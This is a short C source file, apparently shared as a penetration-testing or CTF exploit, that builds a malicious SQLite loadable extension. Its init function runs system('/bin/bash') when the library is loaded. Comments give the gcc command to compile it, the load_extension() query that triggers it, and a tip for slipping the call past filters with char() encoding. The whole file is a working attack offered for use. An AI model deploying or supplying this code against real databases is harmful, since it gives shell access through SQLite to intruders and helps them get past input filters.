// @manesec.
// Exploit sqlite3 with bad_extension.

// gcc -fPIC -shared exp.c -o exp.so

// $ sqlite3 ./test.db
// SQLite version 3.43.1 2023-09-11 12:01:27
// Enter ".help" for usage hints.
// sqlite> select load_extension("./exp");

// May bypass with char(xxx,xxx,xxx)

// Reference: https://sqlite.org/loadext.html

#include "sqlite3ext.h"
SQLITE_EXTENSION_INIT1
#include <assert.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#ifdef _WIN32
__declspec(dllexport)
#endif

int sqlite3_extension_init(
  sqlite3 *db,
  char **pzErrMsg,
  const sqlite3_api_routines *pApi
){
  system("/bin/bash");

  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);
  return rc;
}
